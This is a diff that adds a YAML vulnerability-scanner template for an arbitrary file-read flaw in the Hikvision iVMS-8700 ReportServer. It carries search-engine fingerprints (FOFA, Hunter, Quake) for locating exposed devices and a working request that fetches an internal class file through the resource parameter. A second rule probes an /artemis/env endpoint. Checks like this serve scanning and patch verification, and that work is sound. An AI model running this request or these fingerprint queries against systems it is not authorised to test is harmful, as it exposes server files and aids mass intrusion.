@@ -1,0 +1,60 @@
+name: haikang-iVMS-8700-ReportServer-file-read
+detail:
+  author: 
+  links:
+    - 
+  vulnerability:
+    level: critical
+    fofa-query: icon_hash="-911494769"
+    hunter-query: web.icon=="3670cbb1369332b296ce44a94b7dd685"
+    quake-query: favicon:"3670cbb1369332b296ce44a94b7dd685"
+    zoomeye-query: 
+    threatbook-query: 
+    cve: 
+    tips: 
+
+transport: http
+set:
+    s1: randomInt(1000000000, 9000000000)
+    s2: randomLowercase(8)
+    s3: randomLowercase(8)
+    rboundary: randomInt(800000000, 1000000000)
+    reverse: newReverse()
+    reverseURL: reverse.url
+    rurl: request.url
+    t1: timeConvert(now(), '2006-01-02')
+    t2: timeConvert(now(), '2006-01')
+    b1: base64Decode("")
+    h1: hexDecode("")
+    # m5: md5(string(rurl))
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /vss/ReportServer?op=resource&resource=/com/hikvision/cms/vss/biz/syscfg/user/service/IUserPtzPowerBasicService.class 
+      follow_redirects: false
+      headers:
+      body:
+      
+    expression:  response.status == 200 && response.body_string.contains("fetchUserPtzPowerList")
+
+    output:
+      search: |-
+        "(?P<rfile>\\w+.jsp)".bsubmatch(response.body)
+      rfile: search["rfile"]
+      search1: |-
+        "(?P<rdir>ico.*jsp)".bsubmatch(response.body)
+      rdir: search["rdir"]
+
+  r1:
+    request:
+      method: GET
+      path: /artemis/env
+      follow_redirects: false
+      headers:
+      body:
+
+    expression:  response.status == 200 && response.body_string.contains("profiles")
+
+expression: r0()
